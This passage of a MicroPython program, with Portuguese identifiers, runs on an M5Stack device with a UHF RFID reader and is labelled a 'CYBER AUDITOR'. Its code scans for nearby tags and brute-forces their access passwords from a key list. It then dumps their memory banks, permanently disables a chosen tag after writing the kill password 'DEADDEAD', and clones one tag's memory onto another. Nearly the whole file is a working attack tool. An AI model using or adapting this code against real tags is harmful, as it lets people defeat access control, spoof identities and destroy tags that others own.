def limpar_dado(raw):
    if raw is None: return "---"
    try: return str(raw).replace("b'", "").replace("'", "")
    except: return "Erro"

def identificar_chip(tid):
    t = limpar_dado(tid)
    if len(t) < 6: return "Gen2 Standard"
    return CHIP_DB.get(t[:6].upper(), "Standard Tag")

# --- CORE LOGIC ---
def travar_na_tag(epc):
    try: 
        if uhf: uhf.select(1, 32, len(epc)*4, epc)
        time.sleep(0.05)
    except: pass

def resetar_filtro():
    try: uhf.select(1, 0, 0, "") 
    except: pass

# --- TELAS ---
def desenhar_lista_tags():
    M5.Lcd.fillRect(0, 36, 320, 174, C_BG)
    
    if not tags_encontradas:
        M5.Lcd.setTextColor(C_SUBTEXT, C_BG)
        M5.Lcd.setTextSize(2)
        M5.Lcd.setCursor(80, 100); M5.Lcd.print("NO SIGNAL")
        return

    M5.Lcd.setTextColor(C_ACCENT, C_BG)
    M5.Lcd.setTextSize(1)
    M5.Lcd.setCursor(250, 42); M5.Lcd.print(f"ALVOS: {len(tags_encontradas)}")

    start_idx = max(0, cursor_index - 3)
    y = 60
    
    for i in range(start_idx, min(len(tags_encontradas), start_idx + 3)):
        tag = tags_encontradas[i]
        
        if i == cursor_index:
            M5.Lcd.fillRoundRect(10, y, 300, 40, 6, C_ACCENT)
            txt_color = C_BG; bg_color = C_ACCENT; icon = ">"
        else:
            M5.Lcd.fillRoundRect(10, y, 300, 40, 6, C_PANEL)
            txt_color = C_SUBTEXT; bg_color = C_PANEL; icon = " "

        M5.Lcd.setTextColor(txt_color, bg_color)
        M5.Lcd.setTextSize(1) 
        M5.Lcd.setCursor(20, y+16) 
        
        disp_epc = tag[:26] 
        M5.Lcd.print(f"{icon} {disp_epc}")
        y += 45

def tela_scan_mode():
    global tags_encontradas, cursor_index
    resetar_filtro() 
    tags_encontradas = []
    cursor_index = 0
    
    ui_header("CYBER AUDITOR")
    ui_footer("SCAN", "NEXT", "HACK") 
    desenhar_lista_tags()
    
    while True:
        M5.update()
        if wdt: wdt.feed()
        
        if M5.BtnA.isPressed():
            M5.Lcd.fillCircle(305, 20, 4, C_ACCENT)
            try:
                dados = uhf.inventory()
                if dados:
                    epc = str(dados).replace("b'", "").replace("'", "")
                    if epc not in tags_encontradas and len(epc) > 4:
                        tags_encontradas.append(epc)
                        M5.Speaker.tone(4000, 20)
                        desenhar_lista_tags()
            except: pass
            time.sleep(0.05)
            M5.Lcd.fillCircle(305, 20, 4, C_HEADER)
            
        if M5.BtnB.wasPressed():
            if tags_encontradas:
                cursor_index = (cursor_index + 1) % len(tags_encontradas)
                desenhar_lista_tags()
                M5.Speaker.tone(1000, 50)
        
        if M5.BtnC.wasPressed():
            if tags_encontradas:
                alvo = tags_encontradas[cursor_index]
                M5.Speaker.tone(2000, 100)
                executar_ataque(alvo)
                return 

def atualizar_progresso(i, total, senha):
    step = int(total / 40)
    if step < 1: step = 1
    if i % step != 0 and i != total: return
    
    pct = int((i / total) * 100)
    bar_w = 280
    fill_w = int((i / total) * bar_w)
    
    M5.Lcd.drawRect(20, 120, bar_w, 20, C_SUBTEXT)
    M5.Lcd.fillRect(22, 122, fill_w, 16, C_ACCENT)
    
    M5.Lcd.fillRect(120, 150, 100, 30, C_BG)
    M5.Lcd.setCursor(135, 155)
    M5.Lcd.setTextSize(2)
    M5.Lcd.setTextColor(C_TEXT, C_BG)
    M5.Lcd.print(f"{pct}%")
    
    M5.Lcd.fillRect(0, 90, 320, 20, C_BG)
    M5.Lcd.setCursor(20, 90)
    M5.Lcd.setTextSize(1)
    M5.Lcd.setTextColor(C_SUBTEXT, C_BG)
    M5.Lcd.print(f"TRYING: {senha}")

def ler_memoria(senha):
    if wdt: wdt.feed()
    res = {"PWD": senha, "RES": None, "EPC": None, "TID": None, "USR": None}
    p = senha if senha else "00000000"
    
    try: res["RES"] = limpar_dado(uhf.read_mem_bank(0, 0, 4, p))
    except: pass
    if wdt: wdt.feed()
    try: res["EPC"] = limpar_dado(uhf.read_mem_bank(1, 2, 8, p))
    except: pass
    try: res["TID"] = limpar_dado(uhf.read_mem_bank(2, 0, 6, p))
    except: pass
    try: res["USR"] = limpar_dado(uhf.read_mem_bank(3, 0, 4, p))
    except: pass
    return res

def tela_relatorio(dados, sucesso):
    ui_header("DUMP REPORT")
    
    if sucesso:
        ui_footer("KILL", "EXIT", "CLONE") 
    else:
        ui_footer("", "EXIT", "")
    
    status_txt = "ACCESS GRANTED" if sucesso else "RESTRICTED"
    bg_col = C_SUCCESS if sucesso else C_DANGER
    
    M5.Lcd.fillRect(0, 40, 320, 25, bg_col)
    M5.Lcd.setTextSize(2)
    M5.Lcd.setTextColor(C_BG)
    M5.Lcd.setCursor(60, 45); M5.Lcd.print(status_txt)
    
    y = 75
    
    def draw_row(l, v, y_pos, color=C_TEXT):
        M5.Lcd.setTextSize(1)
        M5.Lcd.setTextColor(C_SUBTEXT, C_BG)
        M5.Lcd.setCursor(10, y_pos); M5.Lcd.print(l)
        M5.Lcd.setTextColor(color, C_BG)
        M5.Lcd.setCursor(110, y_pos); M5.Lcd.print(v[:20] if v else "---")
        M5.Lcd.drawLine(10, y_pos+10, 310, y_pos+10, C_PANEL)

    chip = identificar_chip(dados["TID"])
    pwd_disp = dados["PWD"] if dados["PWD"] else "OPEN/UNKNOWN"
    
    draw_row("PASSWORD", pwd_disp, y, C_ACCENT)
    draw_row("CHIP TYPE", chip, y+18, C_SUCCESS)
    draw_row("EPC ID", dados["EPC"], y+36)
    draw_row("TID SERIAL", dados["TID"], y+54)
    
    M5.Lcd.setTextColor(C_ACCENT, C_BG)
    M5.Lcd.setCursor(10, y+80); M5.Lcd.print("USER MEMORY DUMP:")
    
    M5.Lcd.drawRect(10, y+95, 300, 30, C_PANEL)
    
    M5.Lcd.setTextColor(C_TEXT, C_BG)
    M5.Lcd.setCursor(15, y+105)
    
    u_data = dados["USR"] if dados["USR"] else ""
    if len(u_data) > 30: M5.Lcd.print(u_data[:28] + "..")
    else: M5.Lcd.print(u_data if u_data else "---")

    while True:
        M5.update()
        if wdt: wdt.feed()
        
        # FUNCIONALIDADE 1: KILL TAG
        if sucesso and M5.BtnA.wasPressed():
            M5.Speaker.tone(2000, 100)
            M5.Lcd.fillScreen(C_BG)
            M5.Lcd.setTextColor(C_DANGER, C_BG)
            M5.Lcd.setTextSize(2)
            M5.Lcd.setCursor(60, 100)
            M5.Lcd.print("KILLING TAG...")
            
            travar_na_tag(dados["EPC"])
            
            try:
                access_pwd = dados["PWD"] if dados["PWD"] else "00000000"
                kill_pwd = "00000000"

                if dados.get("RES") and len(dados["RES"]) >= 8 and dados["RES"] not in ["---", "Erro"]:
                    kill_pwd = dados["RES"][:8]

                if kill_pwd == "00000000":
                    M5.Lcd.setTextSize(1)
                    M5.Lcd.setCursor(30, 130)
                    M5.Lcd.print("INJECTING KILL PWD...")
                    
                    nova_kill_pwd = "DEADDEAD" 
                    
                    uhf.write_mem_bank(0, 0, nova_kill_pwd, access_pwd)
                    time.sleep(0.1)
                    kill_pwd = nova_kill_pwd

                M5.Lcd.setCursor(30, 150)
                M5.Lcd.print(f"SENDING KILL: {kill_pwd}")
                
                uhf.kill(kill_pwd)
                
                time.sleep(1)
                M5.Lcd.fillScreen(C_BG)
                M5.Lcd.setTextColor(C_DANGER, C_BG)
                M5.Lcd.setTextSize(2)
                M5.Lcd.setCursor(40, 100)
                M5.Lcd.print("TARGET DESTROYED")
                M5.Speaker.tone(4000, 500)
                time.sleep(1.5)
                
            except Exception as e:
                M5.Lcd.setCursor(30, 170)
                M5.Lcd.print("KILL FAILED!")
                time.sleep(1.5)
            
            break # Volta pro scan
            
        if M5.BtnB.wasPressed():
            M5.Speaker.tone(1000, 50)
            break
            
        # FUNCIONALIDADE 2: CLONE TAG
        if sucesso and M5.BtnC.wasPressed():
            M5.Speaker.tone(1500, 100)
            tela_clone_scan(dados)
            return
            
        time.sleep(0.1)
    tela_scan_mode()

def executar_ataque(epc):
    M5.Lcd.fillScreen(C_BG)
    M5.Lcd.setTextColor(C_ACCENT, C_BG)
    M5.Lcd.setTextSize(2)
    M5.Lcd.setCursor(60, 50); M5.Lcd.print("LOCKING...")
    
    travar_na_tag(epc)
    time.sleep(0.3)
    
    ui_header("BRUTE FORCE")
    ui_footer("", "STOP", "")
    
    M5.Lcd.setTextSize(1)
    M5.Lcd.setTextColor(C_SUBTEXT, C_BG)
    M5.Lcd.setCursor(10, 50); M5.Lcd.print("TARGET EPC:")
    M5.Lcd.setTextColor(C_TEXT, C_BG)
    M5.Lcd.setCursor(10, 65); M5.Lcd.print(epc[:26])
    
    senha_encontrada = None
    total = len(KEYS)
    
    for i, senha in enumerate(KEYS):
        if wdt: wdt.feed()
        atualizar_progresso(i, total, senha)
        
        try:
            if uhf.write_mem_bank(1, 2, epc, senha):
                if uhf.read_mem_bank(0, 0, 4, senha):
                    senha_encontrada = senha
                    break
        except: pass
        
        M5.update()
        if M5.BtnB.wasPressed(): 
            resetar_filtro()
            tela_scan_mode()
            return
        time.sleep_ms(15) 
        
    M5.Lcd.fillScreen(C_BG)
    M5.Lcd.setCursor(80, 100)
    M5.Lcd.setTextColor(C_ACCENT)
    M5.Lcd.print("PARSING...")
    
    dados = ler_memoria(senha_encontrada)
    resetar_filtro()
    tela_relatorio(dados, sucesso=(senha_encontrada is not None))

# --- TELAS E FUNÇÕES CLONAGEM ---
def tela_clone_scan(dados_origem):
    global tags_encontradas, cursor_index
    resetar_filtro() 
    tags_encontradas = []
    cursor_index = 0
    
    ui_header("CLONE TARGET")
    ui_footer("SCAN", "NEXT", "CLONE") 
    desenhar_lista_tags()
    
    while True:
        M5.update()
        if wdt: wdt.feed()
        
        if M5.BtnA.isPressed():
            M5.Lcd.fillCircle(305, 20, 4, C_ACCENT)
            try:
                dados = uhf.inventory()
                if dados:
                    epc = str(dados).replace("b'", "").replace("'", "")
                    if epc not in tags_encontradas and len(epc) > 4 and epc != dados_origem["EPC"]:
                        tags_encontradas.append(epc)
                        M5.Speaker.tone(4000, 20)
                        desenhar_lista_tags()
            except: pass
            time.sleep(0.05)
            M5.Lcd.fillCircle(305, 20, 4, C_HEADER)
            
        if M5.BtnB.wasPressed():
            if tags_encontradas:
                cursor_index = (cursor_index + 1) % len(tags_encontradas)
                desenhar_lista_tags()
                M5.Speaker.tone(1000, 50)
        
        if M5.BtnC.wasPressed():
            if tags_encontradas:
                alvo = tags_encontradas[cursor_index]
                M5.Speaker.tone(2000, 100)
                executar_ataque_clone(alvo, dados_origem)
                return 

def executar_ataque_clone(epc_alvo, dados_origem):
    M5.Lcd.fillScreen(C_BG)
    M5.Lcd.setTextColor(C_ACCENT, C_BG)
    M5.Lcd.setTextSize(2)
    M5.Lcd.setCursor(60, 50); M5.Lcd.print("LOCKING TGT...")
    
    travar_na_tag(epc_alvo)
    time.sleep(0.3)
    
    ui_header("BRUTE TGT")
    ui_footer("", "STOP", "")
    
    M5.Lcd.setTextSize(1)
    M5.Lcd.setTextColor(C_SUBTEXT, C_BG)
    M5.Lcd.setCursor(10, 50); M5.Lcd.print("TARGET EPC:")
    M5.Lcd.setTextColor(C_TEXT, C_BG)
    M5.Lcd.setCursor(10, 65); M5.Lcd.print(epc_alvo[:26])
    
    senha_alvo = None
    total = len(KEYS)
    
    for i, senha in enumerate(KEYS):
        if wdt: wdt.feed()
        atualizar_progresso(i, total, senha)
        
        try:
            if uhf.write_mem_bank(1, 2, epc_alvo, senha):
                if uhf.read_mem_bank(0, 0, 4, senha):
                    senha_alvo = senha
                    break
        except: pass
        
        M5.update()
        if M5.BtnB.wasPressed(): 
            resetar_filtro()
            tela_scan_mode()
            return
        time.sleep_ms(15) 
        
    M5.Lcd.fillScreen(C_BG)
    
    if senha_alvo:
        M5.Lcd.setTextSize(2)
        M5.Lcd.setCursor(40, 100)
        M5.Lcd.setTextColor(C_ACCENT, C_BG)
        M5.Lcd.print("WRITING CLONE...")
        
        if dados_origem["RES"] and dados_origem["RES"] not in ["---", "Erro"]:
            try: uhf.write_mem_bank(0, 0, dados_origem["RES"], senha_alvo)
            except: pass
            time.sleep(0.05)
            
        if dados_origem["USR"] and dados_origem["USR"] not in ["---", "Erro"]:
            try: uhf.write_mem_bank(3, 0, dados_origem["USR"], senha_alvo)
            except: pass
            time.sleep(0.05)
            
        if dados_origem["EPC"] and dados_origem["EPC"] not in ["---", "Erro"]:
            try: uhf.write_mem_bank(1, 2, dados_origem["EPC"], senha_alvo)
            except: pass
            time.sleep(0.05)
            
        M5.Lcd.fillScreen(C_BG)
        M5.Lcd.setCursor(50, 100)
        M5.Lcd.setTextColor(C_SUCCESS, C_BG)
        M5.Lcd.print("CLONE SUCCESS!")
        time.sleep(2)
    else:
        M5.Lcd.setCursor(40, 100)
        M5.Lcd.setTextColor(C_DANGER, C_BG)
        M5.Lcd.print("TGT HACK FAILED")
        time.sleep(2)
        
    resetar_filtro()
    tela_scan_mode()

